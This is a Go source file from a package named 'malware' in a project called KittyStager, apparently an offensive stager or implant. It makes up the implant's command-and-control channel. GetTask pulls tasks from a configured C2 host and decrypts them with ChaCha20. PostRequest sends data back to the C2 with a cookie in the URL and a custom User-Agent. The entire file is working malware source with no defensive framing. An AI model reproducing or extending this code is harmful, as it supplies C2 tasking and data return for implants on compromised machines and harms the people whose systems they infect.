package malware

import (
	"KittyStager/internal/crypto"
	"KittyStager/internal/task"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"time"
)

func GetTask(config Config, key string) (task.Task, error) {
	t := task.NewTask("", nil)
	c := crypto.NewChaCha20()
	r, err := getRequest(config)
	if err != nil {
		return task.Task{}, err
	}
	d, err := c.Decrypt(r, []byte(key))
	if err != nil {
		return task.Task{}, err
	}
	err = t.UnmarshallTask(d)
	if err != nil {
		return task.Task{}, err
	}
	return *t, nil
}

// getRequest does a get request to the C2
func getRequest(config Config) ([]byte, error) {
	var body []byte
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	target := fmt.Sprintf("%s/%s/%s", config.Host, config.GetEndpoint, config.getCookie())
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}

// postRequest does a post request to the C2
func PostRequest(content []byte, endpoint string, config Config) ([]byte, error) {
	var body []byte
	target := fmt.Sprintf("%s/%s/%s", config.getHost(), endpoint, config.getCookie())
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(content))
	if err != nil {
		return body, err
	}
	req.Header.Add("User-Agent", config.getUserAgent())
	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}
	body, err = io.ReadAll(resp.Body)
	if err != nil {
		return body, err
	}
	return body, nil
}
